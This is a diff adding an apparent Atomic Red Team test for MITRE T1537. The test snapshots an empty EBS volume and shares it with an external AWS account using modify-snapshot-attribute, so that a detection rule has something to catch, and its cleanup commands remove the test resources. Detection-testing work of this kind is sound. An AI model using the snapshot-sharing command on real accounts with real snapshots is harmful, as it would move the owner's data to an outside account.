@@ -1,0 +1,48 @@
+attack_technique: T1537
+display_name: 'Transfer Data to Cloud Account'
+atomic_tests:
+- name: AWS - Share EBS Snapshot with External Account
+  auto_generated_guid: 261b83dc-ed84-4128-b7b3-41fa64980d46
+  description: |
+    Creates an EMPTY 1 GiB volume, snapshots it, and grants createVolumePermission on the
+    snapshot to another AWS account. This emulates data staging/exfiltration to an
+    attacker-controlled cloud account (ModifySnapshotAttribute). The snapshot is empty, so
+    no data leaves the account; the test exists to exercise detections such as the Sigma rule
+    aws_snapshot_backup_exfiltration.yml. All resources are tagged atomic-t1537 and removed by cleanup.
+  supported_platforms:
+  - iaas:aws
+  input_arguments:
+    aws_region:
+      description: AWS region
+      type: string
+      default: us-east-1
+    availability_zone:
+      description: Availability zone within the region
+      type: string
+      default: us-east-1a
+    external_account_id:
+      description: The 12-digit AWS account ID to share the snapshot with (use an account you control)
+      type: string
+      default: "123456789012"
+  dependency_executor_name: sh
+  dependencies:
+  - description: AWS CLI must be installed and configured with credentials.
+    prereq_command: aws sts get-caller-identity >/dev/null 2>&1
+    get_prereq_command: echo "Install the AWS CLI and run 'aws configure' with valid credentials."
+  executor:
+    name: sh
+    elevation_required: false
+    command: |
+      VOL=$(aws ec2 create-volume --region #{aws_region} --availability-zone #{availability_zone} --size 1 --volume-type gp3 --tag-specifications 'ResourceType=volume,Tags=[{Key=Name,Value=atomic-t1537}]' --query VolumeId --output text)
+      aws ec2 wait volume-available --region #{aws_region} --volume-ids $VOL
+      SNAP=$(aws ec2 create-snapshot --region #{aws_region} --volume-id $VOL --tag-specifications 'ResourceType=snapshot,Tags=[{Key=Name,Value=atomic-t1537}]' --query SnapshotId --output text)
+      aws ec2 wait snapshot-completed --region #{aws_region} --snapshot-ids $SNAP
+      aws ec2 modify-snapshot-attribute --region #{aws_region} --snapshot-id $SNAP --attribute createVolumePermission --operation-type add --user-ids #{external_account_id}
+    cleanup_command: |
+      for SNAP in $(aws ec2 describe-snapshots --region #{aws_region} --owner-ids self --filters Name=tag:Name,Values=atomic-t1537 --query 'Snapshots[].SnapshotId' --output text); do
+        aws ec2 modify-snapshot-attribute --region #{aws_region} --snapshot-id $SNAP --attribute createVolumePermission --operation-type remove --user-ids #{external_account_id} 2>/dev/null
+        aws ec2 delete-snapshot --region #{aws_region} --snapshot-id $SNAP
+      done
+      for VOL in $(aws ec2 describe-volumes --region #{aws_region} --filters Name=tag:Name,Values=atomic-t1537 --query 'Volumes[].VolumeId' --output text); do
+        aws ec2 delete-volume --region #{aws_region} --volume-id $VOL
+      done
